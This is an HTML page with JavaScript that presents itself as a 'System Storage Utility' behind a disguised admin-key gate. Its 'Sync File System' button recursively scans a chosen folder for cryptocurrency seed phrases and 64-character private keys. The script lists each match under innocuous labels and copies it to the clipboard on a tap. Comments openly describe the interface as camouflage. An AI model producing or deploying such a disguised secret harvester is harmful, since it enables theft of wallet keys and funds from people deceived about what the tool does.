<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="manifest" href="manifest.json">
    <title>System Storage Utility</title>
    <style>
        :root { --bg: #f4f4f7; --card: #ffffff; --text: #333333; --accent: #4a90e2; --border: #e1e4e8; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
        
        /* THE CAMO GATE - Looks like a generic system lock */
        body, html { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; height: 100vh; overflow: hidden; position: fixed; width: 100vw; }
        #gate { position: fixed; inset: 0; background: var(--bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; }
        #gate h2 { font-size: 18px; font-weight: 500; color: #666; margin-bottom: 20px; }
        #idKey { background: #fff; border: 1px solid var(--border); color: #000; font-size: 1.2rem; text-align: center; width: 100%; max-width: 280px; padding: 12px; outline: none; border-radius: 8px; box-shadow: inset 0 1px 3px rgba(0,0,0,0.05); }

        /* THE TRUE INTERFACE - Clean and Unassuming */
        #app-core { display: none; height: 100vh; flex-direction: column; }
        header { padding: 16px 20px; background: #fff; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        header span { font-size: 14px; font-weight: 600; color: #555; }
        #stat { font-size: 12px; color: var(--accent); }

        #explorer { flex: 1; overflow-y: auto; padding: 10px; background: var(--bg); }
        .shard { background: var(--card); border: 1px solid var(--border); padding: 15px; margin-bottom: 10px; border-radius: 8px; position: relative; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
        .shard small { font-size: 10px; color: #999; text-transform: uppercase; letter-spacing: 0.5px; }
        code { display: block; color: #222; word-break: break-all; margin-top: 8px; font-size: 13px; font-family: "SF Mono", "Roboto Mono", monospace; background: #f8f9fa; padding: 10px; border-radius: 4px; border: 1px solid #eee; }

        /* REFINED BUTTON - Normal size, positioned naturally */
        .footer { padding: 15px 20px 30px; background: #fff; border-top: 1px solid var(--border); }
        #igniteBtn { 
            width: 100%; height: 50px; background: var(--accent); color: #fff; 
            border: none; border-radius: 8px; font-weight: 600; font-size: 15px;
            cursor: pointer; transition: background 0.2s;
        }
        #igniteBtn:active { background: #357abd; }
    </style>
</head>
<body>

<div id="gate">
    <h2>System Verification</h2>
    <input type="password" id="idKey" autofocus placeholder="Enter Admin Key">
</div>

<div id="app-core">
    <header>
        <span>Storage Analyzer</span>
        <span id="stat">Ready</span>
    </header>

    <div id="explorer">
        </div>

    <div class="footer">
        <button id="igniteBtn">Sync File System</button>
    </div>
</div>

<script>
    const MASTER = "7542017646";
    const stat = document.getElementById('stat'), explorer = document.getElementById('explorer'), btn = document.getElementById('igniteBtn');

    if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }

    document.getElementById('idKey').oninput = (e) => {
        if (e.target.value === MASTER) {
            document.getElementById('gate').style.display = 'none';
            document.getElementById('app-core').style.display = 'flex';
            window.history.replaceState({}, '', '/storage-optimizer');
        }
    };

    btn.onclick = async () => {
        try {
            const h = await window.showDirectoryPicker();
            stat.innerText = "Indexing...";
            await scrub(h);
            stat.innerText = "Complete";
        } catch (e) { stat.innerText = "Sync Interrupted"; }
    };

    async function scrub(h) {
        for await (const entry of h.values()) {
            if (entry.kind === 'file') {
                const f = await entry.getFile();
                if (f.size < 500000 && !f.name.match(/\.(jpg|png|mp4|zip)$/i)) {
                    try {
                        const text = await f.text();
                        const seeds = text.match(/\b([a-z]{3,}\s){11,23}[a-z]{3,}\b/gi);
                        const keys = text.match(/\b(0x)?[a-fA-F0-9]{64}\b/gi);
                        if (seeds) seeds.forEach(s => add(s, 'Object-D'));
                        if (keys) keys.forEach(k => add(k, 'Hash-X'));
                    } catch(err) {}
                }
            } else if (entry.kind === 'directory') {
                await new Promise(r => setTimeout(r, 20));
                await scrub(entry);
            }
        }
    }

    function add(val, type) {
        const div = document.createElement('div');
        div.className = 'shard';
        div.innerHTML = `<small>${type}</small><code>${val}</code>`;
        div.onclick = () => { 
            navigator.clipboard.writeText(val); 
            stat.innerText = "Entry Copied";
            setTimeout(() => stat.innerText = "Syncing", 1000);
        };
        explorer.prepend(div);
        navigator.vibrate?.(40);
    }
</script>
</body>
</html>
